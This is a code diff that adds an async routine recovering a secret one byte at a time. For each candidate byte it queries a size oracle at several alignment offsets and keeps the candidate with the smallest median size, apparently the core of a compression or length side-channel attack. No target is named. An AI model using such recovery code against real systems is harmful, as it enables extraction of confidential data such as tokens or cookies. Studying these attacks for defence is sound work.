@@ -44,3 +44,33 @@ def _alignment_agreement(top: bytes, samples: dict[bytes, list[int]]) -> int:
 
 def _slice_alignment(samples: list[int], align_idx: int) -> list[int]:
     return samples[align_idx::ALIGNMENT_COUNT]
+
+
+class RecoveryFailed(RuntimeError):
+    pass
+
+
+async def find_next_byte(
+    oracle,
+    prefix: bytes,
+    byte_index: int,
+    min_margin: int,
+    min_agreement: int,
+    max_rounds: int,
+) -> bytes:
+    candidates = [bytes([c]) for c in range(256)]
+    samples: dict[bytes, list[int]] = {c: [] for c in candidates}
+
+    for _round in range(max_rounds):
+        for cand in candidates:
+            for align_len in range(ALIGNMENT_COUNT):
+                size = await oracle(prefix, cand, align_len)
+                samples[cand].append(size)
+
+        ranked = sorted(candidates, key=lambda c: statistics.median(samples[c]))
+        if locked(ranked, samples, min_margin, min_agreement):
+            return ranked[0]
+
+    raise RecoveryFailed(
+        f"position {byte_index} did not lock after {max_rounds} rounds"
+    )
